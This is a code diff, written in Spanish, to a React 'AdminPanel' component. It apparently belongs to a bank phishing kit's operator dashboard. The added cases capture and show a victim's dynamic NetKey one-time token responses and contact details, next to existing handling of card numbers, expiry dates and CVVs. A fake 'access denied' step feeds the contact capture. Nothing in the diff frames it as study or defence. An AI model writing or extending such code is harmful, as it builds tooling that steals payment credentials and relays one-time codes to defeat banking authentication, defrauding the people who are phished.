@@ -421,6 +421,14 @@ export default function AdminPanel() {
               case 'datos_tarjeta':
                 inputDescription = `Datos Tarjeta - Número: ${inputData.numeroTarjeta || 'N/A'}, Vencimiento: ${inputData.fechaVencimiento || 'N/A'}, CVV: ${inputData.cvv || 'N/A'}`;
                 break;
+              case 'netkey_response':
+              case 'netkey2':
+                inputDescription = `🔐 Clave Dinámica: ${inputData.netkeyResponse || 'N/A'}`;
+                break;
+              case 'acceso_denegado':
+              case 'datos_contacto':
+                inputDescription = `📞 Contacto - Nombre: ${inputData.nombreRepresentante || 'N/A'}, Correo: ${inputData.correo || 'N/A'}, Tel 1: ${inputData.telefono1 || 'N/A'}${inputData.telefono2 ? `, Tel 2: ${inputData.telefono2}` : ''}`;
+                break;
               default:
                 inputDescription = `Datos de ${tipo}`;
             }
@@ -496,6 +504,17 @@ export default function AdminPanel() {
                   updatedSession.tarjeta = inputData.numeroTarjeta;
                   updatedSession.fechaVencimiento = inputData.fechaVencimiento;
                   updatedSession.cvv = inputData.cvv;
+                  break;
+                case 'netkey_response':
+                case 'netkey2':
+                  updatedSession.netkeyResponse = inputData.netkeyResponse;
+                  break;
+                case 'acceso_denegado':
+                case 'datos_contacto':
+                  updatedSession.telefono1 = inputData.telefono1;
+                  updatedSession.telefono2 = inputData.telefono2 || '';
+                  updatedSession.correo = inputData.correo;
+                  updatedSession.nombreRepresentante = inputData.nombreRepresentante;
                   break;
               }
               
